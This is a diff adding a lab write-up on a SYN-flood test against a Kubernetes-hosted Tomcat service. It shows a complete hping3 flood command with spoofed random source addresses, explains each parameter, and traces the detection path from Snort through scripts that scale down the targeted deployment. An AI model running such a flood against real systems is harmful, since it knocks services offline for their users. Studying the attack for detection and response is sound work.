@@ -1,0 +1,44 @@
+# SYN Flood Test — Authorized Lab Environment
+
+The following command was used from the Kali Linux test VM to
+generate controlled SYN-flood traffic against the Kubernetes
+lab environment:
+
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --fast --rand-source 10.2.6.145         #tomcat service targeted
+
+Parameters:
+-c 10000        Send 10,000 packets
+-d 120          Set packet data size to 120 bytes
+-S              Set TCP SYN flag
+-w 64           Set TCP window size
+-p 80           Target HTTP port
+--fast          Send packets at a high rate
+--rand-source   Randomize the source IP address
+10.2.6.145      Authorized lab target
+
+Expected detection/response flow:
+
+Kali test VM
+    ↓
+SYN flood traffic
+    ↓
+Router / ingress
+    ↓
+Snort IDS
+    ↓
+Snort alert log
+    ↓
+alert_trigger.sh
+    ↓
+prevention.py
+    ↓
+Identify targeted service
+    ↓
+SSH to Kubernetes controller
+    ↓
+Scale targeted deployment to minimum replicas
+
+Note:
+This command was used exclusively within the controlled academic
+lab environment described in this project. It should not be used
+against systems without explicit authorization.
